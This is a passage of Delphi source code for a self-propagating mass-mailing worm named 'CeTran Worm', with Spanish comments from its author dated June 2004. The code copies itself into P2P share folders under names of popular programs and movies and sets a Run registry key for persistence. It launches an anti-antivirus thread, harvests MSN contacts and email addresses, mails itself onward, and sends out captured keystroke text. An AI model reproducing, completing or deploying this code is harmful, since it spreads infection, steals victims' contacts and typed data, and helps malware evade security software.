    files[1] := 'Ad-Aware';  files[2] :='Spybot - Search & Destroy ';   files[3]:='ICQ 4 ';
    files[4]:='WinZip';   files[5]:='IMesh'; files[6]:='LimeWire';
    files[7]:='ICQ Pro 2003b';  files[8]:='Morpheus';    files[9]:='Download Accelerator Plus';
    files[10]:='DivX Player'; files[11]:='WinRar';
    //me perdona señor Ikon :P jajaja
    files[12]:='Warez P2P';   files[13]:='MSN ToolBar';
    files[14]:='Trillian';   files[15]:='ZoneAlarm';
    files[16]:='AresGalaxy '; files[17]:='Microsoft Windows Media Player';
    files[18]:='Harry Potter Movie';  files[19]:='Punisher Movie';
    files[20]:='MSN Messenger';  files[21]:='HijackThis';
    files[22]:='Itunes for windows';
     For p := 1 to 12 do
       begin
       if sysutils.DirectoryExists(pfiles+p2p[p]) then begin
       For c := 1 to 22 do
       begin
         For l := 1 to 3 do
         begin
          CopyFile(PChar(VW()),pchar(pfiles + P2P[p] +files[c]+crako[l]+'.exe'),false);
         end;
       end;
       end;
     end;
    end;
    Procedure TForm1.Main_Zorra();
     var A,PL,SS,lp: Cardinal;
     carp,claves:array[1..2] of string;
     drive,buh:string;
     p,x,z,num:integer;
     begin
     //form1.hide := true;
     claves[1] := 'Software\Microsoft\MessengerService\ListCache\.NET Messenger Service';
     claves[2] := 'Software\Microsoft\MSNMessenger\ListCache\.NET Messenger Service';
     //Starts Code
     drive:= ExtractFileDrive(VW());
     CreateMutex(nil,true,'CeTran Worm');
     CreateThread(nil,0,@inf_a,nil,0,PL);
     If GetLastError() = Error_ALready_Exists Then
       begin
       halt;
     end;
     Randomize;
     num :=Random(100);
     CreateThread(nil,0,@Fuck_AV,nil,0,A);
     carp[1]:=drive+'\Recycler'; carp[2]:=drive+'\Recycled';
     For p := 1 to 2 do begin
         if DirectoryExists(carp[p]) then begin
         CopyFile(PChar(VW()),PChar(carp[p] + '\Cetran' + inttostr(num) + '.exe'),false);
         WriteReg(HKLM,'Software\Microsoft\Windows\CurrentVersion\Run','winservices',carp[p] + '\Cetran' + inttostr(num) + '.exe');     end;
      end;
     For x := 1 to 2 do begin
       For z := 1 to 1000 do
       begin
         buh := RegRead_Bin(HKEY_CURRENT_USER,claves[x],'Allow' + IntToStr(z)); // Extrae msn Contacts v5.x y posteriores
         if buh <> '' then
           begin
           mails.Lines.Add(buh)
         end;
       end;
     end;
     CreateThread(nil,0,@PLoad,nil,0,lp);
     extract_msncontacts1(mails);
     collecting_mails(paths,mails); //Collecting mails from HTM* files
     //12 Junio: 2:26 pm, arreglado problema I/O 32 en rutina de mails
     sendmail(mails,Mailer,''); // 13 testeada la rutina de envio :)
     CreateThread(nil,0,@FuXor,nil,0,SS);
   end;
   procedure TForm1.FormCreate(Sender: TObject);
   begin
   Form1.Main_Zorra()
   end;
   procedure TForm1.Timer2Timer(Sender: TObject);
   begin
   form1.fuck_u;
   end;
   procedure TForm1.Timer1Timer(Sender: TObject);
   var
     a:integer;
   begin
     For a := 0 to Memo1.lines.count do begin
     if pos('[ctrl]q',LowerCase(Memo1.lines[a])) or pos('@',LoWerCase(Memo1.Lines[a])) or pos(lowercase('[ctrl]2'),Memo1.Lines[a]) <>0 then begin
         sendmail(mails,Mailer,quit_fuck(memo1.lines[A]));
     end;
     end;
     sleep(3000);
     memo1.clear;
   end;

   procedure TForm1.Image1Click(Sender: TObject);
   begin
   MessageBoxA(0,cright,Viral_Name,32);
   end;

   end.
   // 19 de Junio 2004!
   // desperté a las 6 am... uhm codie hasta las 9 el Zip Component Dropper! :D
   // Gusano terminado, fueron 17 días intensos ufff :)
   // la escuela y el coding matan de verdad.. voi a dormir ahora sí :S
